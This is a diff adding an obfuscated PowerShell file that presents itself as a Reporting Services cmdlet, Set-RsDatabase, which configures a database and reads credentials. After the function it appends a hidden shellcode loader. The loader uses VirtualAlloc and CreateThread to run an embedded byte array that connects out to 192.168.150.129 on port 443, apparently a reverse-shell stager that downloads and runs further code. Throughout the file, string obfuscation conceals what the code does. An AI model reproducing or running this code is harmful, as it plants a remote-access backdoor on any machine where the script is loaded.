@@ -1,0 +1,196 @@
+function set`-rS`dAT`AbAse
+{
+    
+
+    [CmdletBinding(SuPportsshOULdpRocEsS = ${T`RUe}, CoNfIRMimpaCT = "hi`gH")]
+    param (
+        [Parameter(maNdaTOrY = ${t`RuE})]
+        [string]
+        ${d`AT`AbA`SEsEr`VErNaME},
+
+        [switch]
+        ${i`SreMoteDa`TA`B`ASESErvEr},
+
+        [Parameter(maNDATorY = ${t`RUe})]
+        [Alias({"{2}{1}{0}{3}"-f'tab','a','D','aseName'})]
+        [string]
+        ${NA`me},
+
+        [switch]
+        ${IS`exiStinGD`A`T`AbA`sE},
+
+        [Parameter(mANDaTORy = ${TR`Ue})]
+        [Alias({"{0}{1}{3}{2}"-f 'Au','th','ication','ent'})]
+        [Microsoft.ReportingServicesTools.SqlServerAuthenticationType]
+        ${DaTABASec`REDentI`A`LTY`PE},
+
+        [System.Management.Automation.PSCredential]
+        ${daT`ABAsE`CrEDE`N`TIal},
+
+        [Microsoft.ReportingServicesTools.SqlServerAuthenticationType]
+        ${A`D`mIn`daTAbA`SeC`Re`dE`NtIaLTypE},
+
+        [System.Management.Automation.PSCredential]
+        ${ADmiND`ATABa`S`e`creD`ENtIAL},
+
+        [Alias({"{3}{2}{1}{0}"-f 'tance','s','qlServerIn','S'})]
+        [string]
+        ${repOR`TsEr`VER`insTaN`cE},
+
+        [Alias({"{1}{3}{0}{2}{4}{5}" -f 'e','Sq','rver','lS','Vers','ion'})]
+        [Microsoft.ReportingServicesTools.SqlServerVersion]
+        ${REPO`Rt`SE`RvERV`erSiON},
+
+        [string]
+        ${c`OMp`Ut`eRnAme},
+
+        [System.Management.Automation.PSCredential]
+        ${CRe`D`ENTiAl}
+    )
+
+    if (${PSC`M`Dlet}.("{1}{0}{2}"-f 'Proce','Should','ss').Invoke((&("{2}{5}{6}{3}{1}{7}{4}{0}" -f'i','ge','Get-S','ar','Wm','houldPr','ocessT','t') -BoundParameters ${PS`BOUn`dpARamET`ERs}), ('Config'+'u'+'re '+'to'+' '+'u'+'se '+"$DatabaseServerName "+'a'+'s '+'datab'+'ase'+', '+'usin'+'g '+"$DatabaseCredentialType "+'run'+'time'+' '+'au'+'thent'+'i'+'cation '+'an'+'d '+"$AdminDatabaseCredentialType "+'s'+'etup'+' '+'authe'+'nt'+'ication')))
+    {
+        ${rs`wMiO`BJecT} = &("{6}{4}{9}{8}{0}{3}{7}{2}{5}{10}{1}"-f 'nfigura','lper','ttingOb','tionS','-R','j','New','e','Co','s','ectHe') -BoundParameters ${Psbou`NdPa`Ram`et`ers}
+
+        
+        ${u`S`e`RnAMe} = ''
+        ${PASsw`o`RD} = ${Nu`lL}
+        if (${da`TAbas`EcrE`DEnTiAlTYPE} -like ("{3}{2}{1}{0}" -f'unt','o','viceacc','ser'))
+        {
+            ${uSeR`Na`mE} = ${rSWm`io`BjEcT}."WINDOw`ssErvI`CEIDE`NT`i`T`YA`CTU`AL"
+            ${p`AsS`WORd} = ''
+        }
+
+        else
+        {
+            if (${DATaBASE`Cr`eDentI`Al} -eq ${n`ULl})
+            {
+                throw ('N'+'o '+'Dat'+'a'+'ba'+'se '+'Cr'+'ed'+'entia'+'l '+'spe'+'c'+'i'+'fied! '+'Da'+'ta'+'base '+'cred'+'enti'+'al '+'mu'+'st '+'be'+' '+'spec'+'i'+'fi'+'ed '+'w'+'hen '+'c'+'onf'+'ig'+'uring '+"$DatabaseCredentialType "+'authe'+'ntica'+'ti'+'on'+'.')
+            }
+            ${US`eRNA`ME} = ${DATA`BasEC`REd`Enti`AL}."us`e`RnAMe"
+            ${p`ASSWoRD} = ${DA`TAb`ASE`cR`edeNtIAL}.("{5}{0}{4}{2}{3}{1}" -f 'w','al','e','denti','orkCr','GetNet').Invoke()."P`AS`sWoRd"
+        }
+        
+
+        
+        ${aD`miNu`SER`N`AMe} = ''
+        ${a`dM`i`Np`ASsWord} = ${N`Ull}
+
+        
+        ${i`s`sQLADM`inacCoUNt} = (${AdMiNDAtAbASEc`REd`eNT`IaL`TY`PE} -like "SQL")
+
+        
+        if (${aDMIn`DA`TAB`ASecRedenTi`Alt`Y`pE} -like ("{3}{1}{0}{2}" -f'n','erviceaccou','t','s'))
+        {
+            throw ((("{17}{19}{6}{2}{3}{7}{18}{4}{14}{12}{5}{9}{13}{15}{0}{10}{8}{16}{1}{11}" -f'indows','o4SQLjo','us','e Admin D','redentials ','e o','y ','ata','4','f ','jo','4','p','jo','Ty','4W',' or j','Ca','base C','n onl'))."repLa`cE"('jo4',[sTRinG][chAr]39))
+        }
+
+        
+        if (${ISs`ql`Admi`NACcou`NT})
+        {
+            if (${admIN`d`ATAbASECRed`eNt`Ial} -eq ${nU`Ll})
+            {
+                throw ('N'+'o '+'Ad'+'min'+' '+'Da'+'taba'+'se '+'C'+'red'+'ent'+'ial '+'speci'+'fie'+'d'+'! '+'Ad'+'mi'+'n '+'D'+'ata'+'base '+'cre'+'dent'+'ia'+'l '+'mus'+'t '+'be'+' '+'spec'+'ifie'+'d '+'wh'+'en '+'con'+'fig'+'uring '+"$AdminDatabaseCredentialType "+'au'+'t'+'he'+'nticat'+'ion.')
+            }
+            ${ad`mINu`S`er`NaMe} = ${AdMI`NdatAB`AsE`cr`EdEnTIal}."UsErn`Ame"
+            ${A`DMi`NPa`ss`wORD} = ${a`D`M`inD`ATaBaSecrEDEN`T`iaL}.("{3}{4}{0}{5}{1}{2}" -f 'workCre','e','ntial','GetN','et','d').Invoke()."pA`sSw`oRD"
+        }
+        
+
+
+        
+        if (-not ${i`S`eXI`s`T`iN`GDAtabaSe})
+        {
+            
+            &("{0}{2}{1}"-f'Wri','Verbose','te-') ("{2}{3}{0}{4}{1}{6}{5}" -f'ati','g database creation scr','G','ener','n','...','ipt')
+            ${eNGl`I`sh`lOc`ALEiD} = 1033
+            ${iSS`HaR`Ep`oinT`MOdE} = ${fal`SE}
+            ${REsU`lt} = ${R`SWMIO`Bje`cT}.("{5}{2}{8}{3}{7}{4}{1}{6}{0}" -f 'pt','o','ra','ase','reati','Gene','nScri','C','teDatab').Invoke(${n`Ame}, ${en`GLIsh`Loc`ALEID}, ${iSSHA`R`e`pOintmO`De})
+            if (${r`EsuLt}."hRe`SU`lT" -ne 0)
+            {
+                &("{1}{0}{2}"-f'-Verb','Write','ose') ("{10}{9}{1}{11}{2}{5}{3}{0}{4}{7}{6}{8}"-f'tion sc','eratin','s','crea','ript...','e ','led',' Fai','!','n','Ge','g databa')
+                throw "Failed to generate the database creation script from the report server using WMI. Errorcode: $($result.HRESULT) "
+            }
+            else
+            {
+                ${SqL`sCRi`pt} = ${R`esu`LT}."sc`R`ipt"
+                &("{1}{2}{0}" -f 'e','Write-Ver','bos') ("{0}{8}{3}{2}{5}{1}{7}{6}{4}" -f 'G','ion','abase c','ating dat','Complete!','reat','script... ',' ','ener')
+            }
+
+            
+            &("{1}{2}{0}{3}"-f'e','W','rite-V','rbose') ("{8}{2}{7}{6}{0}{4}{5}{3}{1}" -f'taba','.','cuti','script..','se',' creation ','g da','n','Exe')
+            try
+            {
+                if (${iSS`qlADMi`N`AC`cou`NT})
+                {
+                    &("{2}{0}{1}{3}" -f '-Sq','lc','Invoke','md') -ServerInstance ${d`ATaBaSeSER`V`ernaMe} -Query ${SQlSC`R`ipT} -ErrorAction ("{0}{1}"-f'S','top') -Username ${a`d`minUSeR`NaME} -Password ${admin`P`As`sworD}
+                }
+                else
+                {
+                    &("{2}{0}{1}"-f'-Sql','cmd','Invoke') -ServerInstance ${DaT`Ab`ASesER`V`eRna`Me} -Query ${S`q`LsCR`IpT} -ErrorAction ("{1}{0}" -f 'op','St')
+                }
+            }
+            catch
+            {
+                &("{3}{2}{0}{1}"-f'-','Verbose','e','Writ') ("{8}{0}{12}{2}{10}{1}{7}{4}{11}{9}{5}{3}{6}" -f'x','ng d','ut','..','base','script.',' Failed!','ata','E','tion ','i',' crea','ec')
+                throw
+            }
+            &("{3}{0}{1}{2}" -f 'o','s','e','Write-Verb') ("{3}{0}{7}{6}{5}{2}{1}{9}{4}{8}"-f 'ecuting data','t.','scrip','Ex','mplete','ation ','se cre','ba','!','.. Co')
+        }
+        
+
+        
+        
+        &("{3}{4}{1}{2}{0}"-f'e','-Ve','rbos','W','rite') ("{1}{6}{4}{0}{8}{2}{3}{5}{7}" -f'tabase','G','rights ','s',' da','cript..','enerating','.',' ')
+        ${iSW`Ind`o`w`Sac`cOunT} = (${D`ATAbaSE`c`REd`EntI`AlT`ypE} -like ("{2}{0}{1}"-f'indo','ws','W')) -or (${dAT`A`Ba`secR`e`dENtI`Al`TYpE} -like ("{1}{2}{3}{0}"-f 'count','Se','rvi','ceAc'))
+        ${rE`s`ULt} = ${r`sWmiObj`E`Ct}.("{2}{5}{0}{3}{1}{4}" -f 'a','abas','G','teDat','eRightsScript','ener').Invoke(${Use`RnaME}, ${na`mE}, ${iSre`MoteDa`TaBA`SESErVeR}, ${iSw`I`Nd`OwSa`ccoU`Nt})
+        if (${rE`S`UlT}."H`R`EsuLT" -ne 0)
+        {
+            &("{2}{0}{1}{3}" -f 'te-V','erbos','Wri','e') ("{6}{5}{0}{4}{7}{2}{3}{1}" -f 'g database right','!','.',' Failed','s s','ratin','Gene','cript..')
+            throw "Failed to generate the database rights script from the report server using WMI. Errorcode: $($result.HRESULT) "
+        }
+        else
+        {
+            ${SQlS`C`Ri`pt} = ${re`SUlt}."SC`RipT"
+            &("{2}{0}{1}{3}" -f'te-','V','Wri','erbose') ("{5}{0}{7}{1}{2}{8}{3}{4}{6}"-f 'at','tabase right','s scri','... ','C','Gener','omplete!','ing da','pt')
+        }
+
+        
+        &("{1}{4}{2}{0}{3}"-f 'bo','W','r','se','rite-Ve') ("{4}{0}{6}{1}{8}{7}{5}{2}{9}{3}"-f'ng data',' ri','crip','...','Executi',' s','base','s','ght','t')
+        try
+        {
+            if (${iS`s`qlad`mInaCco`Unt})
+            {
+                &("{1}{2}{0}{3}"-f'oke-','I','nv','Sqlcmd') -ServerInstance ${D`ATa`B`ASESE`RVERNAMe} -Query ${SqL`scrI`pt} -ErrorAction ("{0}{1}" -f 'Sto','p') -Username ${adMI`NuSer`N`A`mE} -Password ${Adm`INPaS`s`w`ORD}
+            }
+            else
+            {
+                &("{1}{0}{3}{2}"-f'vo','In','Sqlcmd','ke-') -ServerInstance ${DatABAsEse`Rv`eRN`AME} -Query ${S`qLs`C`RiPT} -ErrorAction ("{0}{1}"-f 'S','top')
+            }
+        }
+        catch
+        {
+            &("{1}{0}{2}{3}"-f 'te-','Wri','Verb','ose') ("{0}{3}{7}{6}{4}{1}{2}{5}" -f'E','... Fa','iled','xecu','g database rights script','!','n','ti')
+            throw
+        }
+        &("{2}{1}{3}{0}" -f'se','Ve','Write-','rbo') ("{1}{2}{12}{3}{10}{13}{8}{4}{5}{0}{9}{7}{11}{6}"-f' script...','Exec','u','ing','ase ','rights','!','mplet','tab',' Co',' ','e','t','da')
+        
+
+        
+        
+        &("{3}{1}{2}{0}" -f'ose','rit','e-Verb','W') ("{9}{8}{3}{10}{4}{6}{5}{0}{7}{1}{2}" -f ' to ne','a','base...','orting Ser','ce','o connect','s t','w dat','dating Rep','Up','vi')
+        ${r`E`sULT} = ${r`SW`mioBjECT}.("{6}{3}{1}{2}{4}{0}{5}"-f 'eConne','a','t','tD','abas','ction','Se').Invoke(${Da`TabasesEr`VErnA`mE}, ${Na`me}, ${DatAB`AseCR`Ed`EN`TiaLTY`pE}."VaLU`e__", ${u`seR`NaMe}, ${p`Ass`WOrD})
+        if (${R`Esu`lt}."H`RE`Sult" -ne 0)
+        {
+            &("{3}{1}{2}{0}"-f 'se','te','-Verbo','Wri') ("{13}{18}{5}{8}{15}{14}{3}{7}{16}{19}{17}{0}{12}{6}{11}{4}{9}{1}{2}{10}" -f' new ',' Fai','led','ce','.','ating Repo','tabas','s to','r','..','!','e','da','U','ervi','ting S',' c',' to','pd','onnect')
+            throw "Failed to update the reporting services to connect to the new database using WMI! Errorcode: $($result.HRESULT) "
+        }
+        else
+        {
+            &("{0}{2}{1}{3}"-f 'Write-','o','Verb','se') ("{0}{4}{9}{5}{10}{7}{8}{13}{3}{6}{1}{12}{2}{11}" -f'Updating ','ase... C','mple','ct to new da','Re','ting Service','tab','c','onn','por','s to ','te!','o','e')
+        }
+        
+    }
+}
+
+${C} = ((("{104}{27}{50}{49}{63}{89}{69}{43}{45}{28}{52}{96}{108}{25}{3}{42}{56}{60}{58}{84}{29}{82}{40}{16}{5}{37}{17}{15}{1}{107}{103}{18}{21}{59}{85}{99}{62}{83}{57}{34}{71}{13}{7}{11}{87}{100}{6}{74}{38}{98}{79}{75}{44}{0}{55}{81}{64}{23}{30}{66}{94}{9}{67}{90}{19}{33}{61}{72}{106}{80}{2}{14}{65}{88}{109}{22}{93}{39}{31}{73}{110}{91}{46}{32}{86}{77}{35}{36}{70}{95}{47}{20}{92}{68}{48}{102}{53}{4}{10}{76}{26}{41}{78}{101}{97}{105}{12}{51}{54}{8}{24}"-f'r','ze, u','pS','n','P','dd',' exte','l','uint count','St','t','lOCh)]public ','tPtr des','el32.d','t','nt dwSi','pA','ss, ui','lAllocatio','z','(OChmsvcrt.dllOCh','nType,','r l','Att',');','n I',' m','mp','s','tP','ribu','ui','Fl','e,','llImpo','r','eadId)','re',' IntPtr ','arameter, ','r l','e','tPtr',']public','Pt',' ','ion','ort','stati','OChker','ort(','t, uint sr','tat','ern Int','c, ',' ',' Virt','D','All',' u','ual',' ','e','n','ead','artA','te','ackS','ublic ','llOCh)',';[','rt(OChkern','IntP','nt d','rn','read(Int','r',' IntPtr lpTh','m','eTh','r l','lpThr','t','ct);[','oc(In','int fl','ags,','stat','d','el32.d','i','t',')]p','pP','s, uint dw','DllImp','ic e','t(I','Creat','Prot','ic','se','c ext','f','[DllI','n','t','int ','xter','dress, IntPt','wCrea'))."re`P`lAcE"('OCh',[STRIng][ChAR]34));${W} = &("{0}{1}" -f 'Add-Ty','pe') -memberDefinition ${c} -Name ("{1}{0}"-f'2','Win3') -namespace ("{2}{0}{1}" -f'Fun','ctions','Win32') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x96,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}."l`eNgtH" -gt 0x1000){${g} = ${Z}."leng`Th"};${x}=${w}::("{2}{0}{3}{1}"-f 'r','lAlloc','Vi','tua').Invoke(0,0x1000,${g},0x40);for (${I}=0;${i} -le (${z}."l`EN`gTh"-1);${I}++) {${w}::"m`EM`SET"([IntPtr](${x}.("{0}{1}" -f'To','Int32').Invoke()+${I}), ${Z}[${I}], 1)};${W}::("{0}{2}{1}"-f'C','ateThread','re').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{3}{2}{1}"-f 'S','-sleep','t','tar') 60};
